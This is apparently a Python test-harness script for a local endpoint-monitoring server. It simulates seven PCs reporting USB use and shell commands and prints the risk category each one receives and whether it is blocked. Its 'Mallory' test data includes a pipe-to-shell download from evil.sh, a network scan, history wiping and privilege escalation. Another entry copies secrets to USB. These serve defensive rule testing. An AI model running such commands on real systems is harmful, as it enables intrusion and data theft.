import json
import sys
import time
import urllib.error
import urllib.request

SERVER = "http://127.0.0.1:8000"
ADMIN = ("admin", "admin12345")


def call(path, body=None, ip=None, key=None, token=None, method=None):
    h = {"Content-Type": "application/json"}
    if ip: h["X-Teramax-Sim-IP"] = ip
    if key: h["X-Agent-Key"] = key
    if token: h["Authorization"] = "Bearer " + token
    req = urllib.request.Request(SERVER + path, json.dumps(body).encode() if body is not None else None,
                                 h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        return {"error": e.code, "detail": e.read().decode()[:200]}


# name, ip, person_id, member_since, verified, usb, commands, expectation (from your rules)
PCS = [
    ("Asha (known, clean)", "10.42.0.11", "asha01", "2019-03-01", True, False,
     ["ls", "git status", "python app.py", "cd projects"], "trusted/normal"),
    ("Ravi (known) sudo+USB", "10.42.0.12", "ravi02", "2018-06-01", True, True,
     ["sudo apt update", "ls /media/usb"], "suspicious  (rule 1)"),
    ("Neha (new) sudo+USB", "10.42.0.13", "neha03", "", False, True,
     ["sudo cp secrets.txt /media/usb/"], "untrusted   (rule 2)"),
    ("Karan (new) sudo, no USB", "10.42.0.14", "karan04", "", False, False,
     ["sudo systemctl restart nginx"], "suspicious  (rule 3)"),
    ("Mallory (attacker)", "10.42.0.15", "mal05", "", False, True,
     ["nmap -sS 10.42.0.0/24", "curl http://evil.sh/x | sh", "history -c", "sudo su"], "untrusted"),
    ("Tina (new, ordinary)", "10.42.0.16", "tina06", "", False, False,
     ["ls", "ping 8.8.8.8", "code ."], "normal"),
    ("Dev (known admin) sudo only", "10.42.0.17", "dev07", "2017-01-01", True, False,
     ["sudo apt upgrade", "docker ps"], "normal"),
]


def main():
    admin = call("/api/admin/login", {"person_id": ADMIN[0], "password": ADMIN[1]})
    if "token" not in admin:
        sys.exit(f"admin login failed: {admin}  (start the server with TERAMAX_ADMIN_PASSWORD={ADMIN[1]})")
    token, keys = admin["token"], {}

    for name, ip, pid, since, verified, usb, cmds, _ in PCS:
        keys[ip] = call("/api/agent/enroll", {"hostname": name.split()[0] + "-PC", "os": "Linux 6"}, ip=ip)["agent_key"]
        r = call("/api/portal/signup", {"pc_number": "PC-" + ip.split(".")[-1], "name": name.split(" (")[0],
                                         "person_id": pid, "department": "Engineering", "member_since": since,
                                         "password": "Passw0rd!" + pid}, ip=ip)
        if r.get("error") == 409:
            call("/api/portal/login", {"person_id": pid, "password": "Passw0rd!" + pid}, ip=ip)
        if verified:
            uid = next(u["id"] for u in call("/api/admin/users", token=token) if u["person_id"] == pid)
            call(f"/api/admin/users/{uid}/verify", {"value": True}, token=token)

    # one heartbeat first (so USB state is known), then the commands
    for name, ip, pid, since, verified, usb, cmds, exp in PCS:
        base = {"usb": usb, "usb_events": 1 if usb else 0, "usb_devices": ["SanDisk Cruzer"] if usb else [],
                "hostname": name.split()[0] + "-PC", "os": "Linux 6"}
        call("/api/agent/report", {**base, "commands": cmds}, ip=ip, key=keys[ip])

    time.sleep(3.5)   # let the enforcement loop run
    print(f"{'PC':32} {'category':11} {'risk':>5}  internet   expected")
    for d in call("/api/admin/devices", token=token):
        exp = next((p[-1] for p in PCS if p[1] == d["ip"]), "unknown")
        print(f"{d['user']['name'] + ' @ ' + d['ip']:32} {d['category']:11} {d['risk']:5.0f}  "
              f"{'ALLOW' if d['access'] else 'BLOCK':8}   {exp}")
    print(f"\nDashboard: {SERVER}/admin   (login: {ADMIN[0]} / {ADMIN[1]})")
    if "--once" in sys.argv:
        return
    print("Sending heartbeats... Ctrl-C to stop (PCs go offline ~30s later).")
    while True:
        for name, ip, pid, since, verified, usb, cmds, _ in PCS:
            call("/api/agent/report", {"usb": usb, "usb_devices": ["SanDisk Cruzer"] if usb else [],
                                       "hostname": name.split()[0] + "-PC"}, ip=ip, key=keys[ip])
        time.sleep(10)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
